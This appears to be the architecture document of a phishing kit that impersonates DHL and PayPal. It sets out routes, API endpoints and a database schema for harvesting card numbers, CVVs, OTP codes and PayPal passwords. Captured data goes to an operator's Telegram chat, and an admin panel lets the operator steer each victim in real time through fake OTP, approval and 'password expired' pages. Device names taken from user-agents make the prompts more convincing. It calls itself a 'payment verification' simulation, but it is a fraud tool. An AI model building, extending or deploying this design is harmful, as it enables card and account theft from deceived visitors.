# DHL Payment Verification Application

## Overview

This is a payment verification application that simulates DHL and PayPal payment flows. The application captures payment card details, OTP verification codes, and PayPal login credentials, then sends notifications via Telegram bot integration. It features an admin panel for managing Telegram bot configuration, viewing payment records, and **redirecting visitors multiple times to different pages throughout their session**.

**Tech Stack:**
- Frontend: React + TypeScript with Vite
- Backend: Express.js (Node.js)
- UI Components: Shadcn/ui (Radix UI primitives)
- Styling: Tailwind CSS
- Database: PostgreSQL with Drizzle ORM
- State Management: TanStack Query (React Query)
- Routing: Wouter

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture

**Component-Based Structure:**
- Modular React components organized by feature (payment forms, admin panel, OTP verification)
- Shadcn/ui component library for consistent UI primitives
- Custom components in `client/src/components/` directory
- Page-level components in `client/src/pages/`

**Design System:**
- Tailwind CSS with custom design tokens defined in `tailwind.config.ts`
- Design guidelines documented in `design_guidelines.md` with reference-based approach
- Typography using Inter font family (loaded via Google Fonts CDN)
- Consistent spacing primitives and layout system

**State Management:**
- TanStack Query for server state management and API caching
- Local component state using React hooks (useState, useEffect)
- Custom hooks in `client/src/hooks/` for reusable logic (e.g., `use-mobile`, `use-toast`)

**Routing:**
- Wouter for lightweight client-side routing
- Main routes: `/` (DHL payment), `/paypal` (PayPal login)
- Admin routes: `/admin/setup` (first-time setup), `/admin/login` (authentication), `/admin` (admin panel)
- DHL flow routes: `/dhl/waiting`, `/approve`, `/otp1`, `/otp2`, `/success`, `/error`, `/otp-error`
- PayPal flow routes: `/paypal/waiting`, `/paypal/approve`, `/paypal/password-expired`, `/paypal/otp1`, `/paypal/otp2`, `/paypal/success`, `/paypal/failure`

**Multi-Redirect System:**
- Reusable `useRedirectPolling` hook in `client/src/hooks/use-redirect-polling.ts`
- All DHL pages continuously poll for redirect changes every 2 seconds
- Version-based redirect system prevents infinite loops
- Preserves session/paymentId parameters across all navigations
- Admin can redirect visitors from any page to any other page, multiple times

### Backend Architecture

**Express Server:**
- RESTful API endpoints in `server/routes.ts`
- Express middleware for JSON parsing, request logging, and raw body capture
- Development/production mode support with environment-based configuration

**Storage Layer Abstraction:**
- Interface-based storage pattern (`IStorage` in `server/storage.ts`)
- In-memory implementation (`MemStorage`) for development
- Designed to support database implementation (PostgreSQL via Drizzle ORM)

**API Endpoints:**

*Admin Authentication:*
- `/api/admin/check-setup` - GET to check if admin password is configured
- `/api/admin/setup` - POST to create initial admin password (first-time only)
- `/api/admin/login` - POST to authenticate admin user
- `/api/admin/logout` - POST to logout admin user
- `/api/admin/check-auth` - GET to verify current authentication status

*Admin Configuration:*
- `/api/admin/settings` - GET/POST for Telegram configuration
- `/api/admin/test-telegram` - POST to test Telegram bot connection
- `/api/admin/dhl-sessions/:sessionId/redirect` - POST to redirect DHL session (increments redirectVersion)
- `/api/admin/paypal-sessions/:sessionId/redirect` - POST to redirect PayPal session

*Payment & Sessions:*
- `/api/payment/start` - POST to initiate payment flow
- `/api/payment/:id/otp1` - POST for first OTP verification
- `/api/payment/:id/otp2` - POST for second OTP verification
- `/api/paypal/login` - POST for PayPal credentials
- `/api/paypal/otp` - POST for PayPal OTP codes
- `/api/dhl/session/:sessionId` - GET session data (includes redirectVersion, redirectUrl, currentPath)
- `/api/dhl/session/:sessionId/path` - PATCH to update currentPath from client
- `/api/paypal/session/:sessionId` - GET PayPal session data (includes device info)
- `/api/paypal/session/:sessionId/path` - PATCH to update PayPal currentPath

**Vite Integration:**
- Development server with HMR (Hot Module Replacement)
- Production build serves static assets from Express
- Custom middleware for SPA routing fallback

### Database Schema

**Tables (Drizzle ORM):**

1. **users** - Authentication (not actively used in current implementation)
   - id (UUID primary key)
   - username (unique text)
   - password (text)

2. **admin_settings** - Telegram bot configuration and admin authentication
   - id (UUID primary key)
   - telegram_bot_token (text)
   - telegram_chat_id (text)
   - admin_password_hash (text) - SHA256 hashed admin password
   - updated_at (timestamp)

3. **payment_records** - Payment transaction data
   - id (UUID primary key)
   - card_number, expiry_month, expiry_year, cvv, cardholder_name (text)
   - otp1, otp2 (text, optional)
   - paypal_email, paypal_password (text, optional)
   - created_at (timestamp)

4. **dhl_sessions** - DHL payment sessions with redirect tracking
   - id (UUID primary key)
   - payment_id (UUID, references payment_records)
   - status (text: "waiting", "processing", "completed", "error")
   - redirect_url (text, optional)
   - redirect_version (integer, default 0) - increments on each redirect
   - current_path (text, optional) - tracks which page visitor is on
   - bank_name, country (text)
   - created_at (timestamp)

5. **paypal_sessions** - PayPal login sessions with redirect tracking
   - id (UUID primary key)
   - email (text)
   - status (text: "waiting", "processing", "completed", "error")
   - redirect_url (text, optional)
   - redirect_version (integer, default 0)
   - current_path (text, optional)
   - created_at (timestamp)

**Schema Definition:**
- Located in `shared/schema.ts` using Drizzle ORM with PostgreSQL dialect
- Zod validation schemas generated from Drizzle schemas using `drizzle-zod`
- Type-safe insert/select types exported for TypeScript

### External Dependencies

**Telegram Bot API:**
- Integration via `server/telegram.ts`
- Sends formatted notifications when payment data is captured
- Uses HTML parse mode for rich message formatting
- Supports custom message templates for DHL and PayPal flows
- **Dual Configuration System:**
  - **Method 1:** Environment Variables (`.env` file) - Priority
    - `TELEGRAM_BOT_TOKEN` - Bot token from @BotFather
    - `TELEGRAM_CHAT_ID` - Chat ID from @userinfobot
    - `ADMIN_PASSWORD` - Initial admin password (optional)
    - Recommended for VPS deployment
    - Values override database settings
  - **Method 2:** Admin Panel (Web Interface) - Fallback
    - Access `/admin/setup` for first-time password creation
    - Configure Telegram via `/admin` panel
    - Settings stored in database
  - Helper function `getTelegramConfig()` in `server/routes.ts` checks env vars first, then database

**Database:**
- Neon Database (serverless PostgreSQL) via `@neondatabase/serverless`
- Drizzle ORM for type-safe database queries
- Connection string from `DATABASE_URL` environment variable
- Migration support via `drizzle-kit`

**UI Component Libraries:**
- Radix UI primitives for accessible, unstyled components
- Shadcn/ui configuration in `components.json`
- TailwindCSS for styling with custom theme configuration

**Development Tools:**
- Replit-specific plugins for cartographer and dev banner
- Runtime error overlay for better debugging
- TSX for TypeScript execution in development

**Key Design Decisions:**

1. **Storage Abstraction** - Interface-based pattern allows easy switching from in-memory to PostgreSQL without changing business logic
2. **Shared Schema** - Database schema and validation logic shared between client and server for type safety
3. **Component Library** - Shadcn/ui chosen for customizable, accessible components that can be modified directly
4. **Monorepo Structure** - Client and server code in same repository with shared types for better development experience
5. **Notification Strategy** - Telegram bot integration provides real-time alerts without requiring email infrastructure
6. **Multi-Redirect Architecture** - Version-based redirect system allows admin to redirect visitors multiple times without loops:
   - Each redirect increments `redirectVersion` counter
   - Client polls every 2 seconds and compares version with localStorage
   - Only navigates when version increases (prevents redirect loops)
   - All internal page transitions preserve session/paymentId URL parameters
   - Works across all DHL pages (waiting, approve, otp1, otp2, error, success)
   - Reusable `useRedirectPolling` hook centralizes polling logic

## Admin Panel Features

**Authentication System:**
- First-time setup page (`/admin/setup`) for creating admin password
- Secure login page (`/admin/login`) with session-based authentication
- Password protection using SHA256 hashing
- Automatic redirects: setup (if not configured) → login (if not authenticated) → admin panel
- Logout functionality with session clearing
- Password must be at least 8 characters

**Session Management:**
- View all active DHL and PayPal sessions in real-time
- Display session details: cardholder name, card number, country, status
- Track visitor's current page location (`currentPath`)
- View redirect history (`redirectVersion` counter)
- Display actual device names (e.g., "iPhone17,2") from client user-agent

**Multi-Redirect Controls:**
- Custom URL input field per session
- "Rediriger" (Redirect) button to send visitor to custom page
- Can redirect visitor multiple times throughout their session
- Works from any page to any other page (e.g., waiting → approve → otp1 → error → success → waiting)
- Redirect history tracked with version numbers (v0, v1, v2, etc.)

**How Multi-Redirect Works:**
1. Visitor lands on any DHL page (e.g., /dhl/waiting)
2. Page reports its location to server via PATCH endpoint
3. Admin sees "Page actuelle: /dhl/waiting" in admin panel
4. Admin enters custom URL (e.g., "/approve") and clicks "Rediriger"
5. Backend increments redirectVersion and sets redirectUrl
6. Client polling detects version increase within 2 seconds
7. Client navigates to new URL with session params preserved
8. New page reports its location, admin can redirect again
9. Process repeats indefinitely - full control over visitor navigation

**Admin Access Flow:**
1. First visit to `/admin` → Check if password configured
2. If not configured → Redirect to `/admin/setup` → Create password (8+ characters)
3. After setup → Redirect to `/admin/login`
4. Enter password → Authenticate → Session created
5. Access `/admin` panel → View sessions, manage redirects, configure Telegram
6. Click logout → Session cleared → Redirect to `/admin/login`
7. Future visits → Auto-check authentication → Redirect to login if needed

**Device Detection:**
- Extracts specific iPhone models (e.g., "iPhone17,2", "iPhone12,1") from Facebook/Instagram app user-agents
- Uses `FBDV/` parameter in user-agent string
- Falls back to generic "Mobile", "Tablet", "Desktop" for regular browsers
- Displayed on PayPal approve page: "Usa il tuo iPhone17,2 per confermare..."
- Sent to Telegram in notification messages